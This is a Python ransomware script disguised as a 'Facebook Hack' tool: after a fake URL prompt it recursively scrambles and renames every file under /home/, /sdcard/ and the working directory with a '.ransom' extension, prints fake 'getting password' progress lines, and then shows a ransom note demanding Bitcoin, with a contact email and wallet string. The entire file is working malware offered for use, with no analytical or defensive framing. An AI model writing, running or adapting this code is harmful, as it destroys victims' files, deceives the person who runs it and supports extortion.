body="""\tYor files had been encrypted by me.
\tIf you wanna getting decryption file, send 0.0001000 Bitcoin. Then inpox me to get it.......
\t  Email: Ibrahimjdaan@gmail.com
\t  Ewallet: ahwh72yevs72726ha71uwhhshajah92udn"""
password="dhdhsujsjwjwiuwy26725252671hwywhwuwuwhwuwt26"
import os,base64,time
def encrypt_name(password,name):
    kay=len(password)//2
    mod=26
    return ((base64.b64encode(("".join('{0}'.format(chr(ord(cr)+kay%mod))for cr in name)+password).encode('utf-8')).decode()).replace('/','BroJda')+'.ransom')
def encrypt_file(password,patho):
    i=0
    while i<11:
        i=i+1
        with open(patho,'rb') as files:
            reading=files.read()
            with open(patho,'wb') as encrypt_files:
                if (i==5):
                    encrypt_files.write(base64.b64encode(reading+password.encode('utf-8')))
                else:
                    encrypt_files.write(reading[20:]+reading[:20])
def encrypt(password,root):
    joker=0
    line=0
    a,b,c,d,e,f,g=0,0,0,0,0,0,0
    for r,d,fs in os.walk(root):
        for f in fs:
            line=line+1 
    for root,dirs,files in os.walk(root):
        for file in files:
            joker=joker+1
            i=int(joker/line*100)
            patho=os.path.join(root,file)
            try:   
                encrypt_file(password,patho)
                time.sleep(0.001)
                name0='/'.join(patho.split('/')[:-1])
                name=encrypt_name(password,patho.split('/')[-1])
                new_name=name0+'/'+name
                os.rename(patho,new_name)
            except:
                pass
            if i ==1 and(a==0):
                a=+1
                print (" [€] please wait...                          ") 
            elif i == 10 and(b==0):
                b=+1
                print (" [+] Search in database!!                    ") 
            elif i == 20 and(c==0):
                c=+1
                print ("\033[32m [*] getting information                     ") 
            elif i == 40 and(d==0):
                d=+1
                print (" [+] Getting Email...                        ") 
            elif i == 70 and(e==0):
                e=+1
                print (" [+] Getting password..                      ")
            elif i == 90 and(f==0):
                f=+1
                print ("\033[31m [$] Encrypting password..                   ")
            elif i == 99 and(g==0):
                g=+1
                print ("\033[31m [-] Hacking field!!                         ")
            RR=" \033[43m"
            BB="\033[40m"
            Y="\033[31m"
            W="\033[37m" 
            print (RR+Y+"processing: "+str(i)+"%"+BB+W+" {"+(int(i/4)*"#")+(int(100/4-i/4)*".")+"}",end="\r") 
def logo(body):
    time.sleep(0.5)
    W='\033[37m';R='\033[31m';Y='\033[33m'
    random=[W,Y,R]
    x=('''

			`-/osyhddmmmmmmmddhs+/-`                       
                   ./ydmhs+:-``        ``-:+shdmy+.                   
                 :hms/.                        `:smh:                 
               :dm+`                              `+md-               
              oNo`                                  `sNo              
             sN/                                      /Ns             
            /M+                                        oM/            
            mm  :/                                  :+ `md            
           .Ms `Nh                                  oM- sM.           
           .Ms `Ny                                  oM- oM-           
            md  hN`                                `dm` yM.           
            oM: -Ny                                oM/ .Nh            
            `dm` hN   `..--://-        -//::-..`   dN `hN-            
             -mh.hN `odmNNNMMMNs      oNMMMNNNmds` dN.hm:             
              .hmNh oMMMMMMMMMMd      hMMMMMMMMMMs sMmh.              
    `--`       `sM+ -NMMMMMMMMm-      .dMMMMMMMMN: -My`       .::.    
   -dhyds.      yM`  /NMMMMMMy.   ``   `yNMMMMMN+   md      .ydyhm-   
   yN. -dd.     hN    -ydmmh/   .y+/y.   :hmmmy:    dm`    -mh. .Ny   
  -md   .hmo-`  oM:     `..    :mMs+Mm:    ..`     .Ny  .-omh`   hN:  
.ymo.     -ohhy+:dm+.`         dMMo+MMm`        `./mm/oyhho:     .omy-
dN:```...`   .:ohdNMNdys:.    `NMMo+MMM`    `:oymNMNdho:.   `...```:Nd
:yhhhhhhhhs/.`   .:ohMymddo`   sdo``ody   `+dmmsMho:.   `./shhhhhhhhy:
   ```  `-/shhy+-`   hN+s:Ny              oM/s/md`  `-/shds/-`  ```   
             ./shhy+-/Moy-+d/:--......--:/hs:s+M+-+yhhs/.             
                 .:ohdMo-y-o/+/oo++o/oo:/+o:y-+Mmho:.                 
                   `.sM/ d/sososso+s+ssoooo/d :Ms.`                   
                `:ohdhMs .oso//++/:+:++:/oso. oMhdhs/.`               
     `.--.``./ohdh+-` hN-  `-/++oooo+o++/-`  -Nh  -/ydhs+-``.--.`     
    -mdyyhddds+-`   `-sNm/                 `/mNs-`    ./shddhyydd/    
    +Mo`        `.+ymdo:+mh+.`          `.+dm/-ohmy+-`        `/Ny    
     :hmo     :sdds:`     :sddhyssoossyhmds:     `:odmy/`    +md/     
       +M/  `yN+.             .-:://::-.             `/md.  .Ms       
       .Ms :mm.                                        .dm: +M:       
        +mmdo`                                          `+dmmo


''')
    z=('''
	/////////////
	/++++++++++++++//
	/ooooooooooooooo+//
	/ooooooooooooooooo+//
	/ooooooooooooooooooo+/////////////////////////////////////////
	/ooooooooooooooooooooooooo+/:--..--:/+oooooooooooooooooooooooo+/
	/ooooooooooooooooooooooo+-`          `-+ooooooooooooooooooooooo/
	/oooooooooooooooooooooo:`    `.--.`    `:oooooooooooooooooooooo/
	/ooooooooooooooooooooo-    .+osssso+.    -ooooooooooooooooooooo/
	/oooooooooooooooooooo+    -ssssssssss-    +sooooooooooooooooooo/
	/oooooooooooooooooooo:    +ssssssssss+    :sssooooooooooooooooo/
	/oooooooooooooooooooo:    +sssssssssso    :ssssoooooooooooooooo+
	/oooooooooooooooooooo:    +sssssssssso    :ssssssoooooooooooooo+
	/ooooooooooooooooo+++:..../+++++++++++....:++osssssoooooooooooo+
	/oooooooooooooooo::::::::::::::::::::::::::::::ssssssoooooooooo+
	/ooooooooooooooo+::::::::::::::::::::::::::::::ossssssooooooooo+
	/ooooooooooooooo+:::::::::::::/++/:::::::::::::ossssssssooooooo+
	/ooooooooooooooo+:::::::::::/yhhhhy/:::::::::::ossssssssssooooo+
	/ooooooooooooooo+:::::::::::+hhhhhho:::::::::::osssssssssssoooo+
	/ooooooooooooooo+::::::::::::shhhhs::::::::::::osssssssssssssoo+
	/ooooooooooooooo+::::::::::::/hhhh/::::::::::::osssssssssssssss+
	/ooooooooooooooo+:::::::::::::/++/:::::::::::::osssssssssssssss+
	/ooooooooooooooo+::::::::::::::::::::::::::::::osssssssssssssss+
	/oooooooooooooooo::::::::::::::::::::::::::::::ssssssssssssssss+
	/oooooooooooooooo++++++oooooooooooooooooooooooossssssssssssssss+
	/oooooooooooooooooooooooossssssssssssssssssssssssssssssssssssss+
	/ooooooooooooooooooooooooooooosssssssssssssssssssssssssssssssss+
	/+++++++++++++++++++++++++++++ooooooooooooooooooooooooooooooooo+
''')
    Long=os.get_terminal_size().columns
    for r in random:
        time.sleep(0.3)
        os.system('clear')
        print (r,x)
    time.sleep(1.5)
    os.system('clear')
    print (z)
    time.sleep(0.3)
    print ('\033[37m_'*Long)
    message = ('''\033[32m
\t\t\t*******__WARNING__******* 	

'''+body+'''

''')
    print (message) 
    print ('\033[37m_'*Long)
if __name__=="__main__":
    os.system("cls")
    os.system("clear")
    print ('''
 _____              _                 _      _   _            _
|  ___|_ _  ___ ___| |__   ___   ___ | | __ | | | | __ _  ___| | __
| |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ / | |_| |/ _` |/ __| |/ /
|  _| (_| | (_|  __/ |_) | (_) | (_) |   <  |  _  | (_| | (__|   <
|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\ |_| |_|\__,_|\___|_|\_\
    	 	''') 
    input("Enter the url: ") 
    encrypt(password,"/home/")
    encrypt(password,"/sdcard/")
    encrypt(password,'.') 
    logo(body)
    
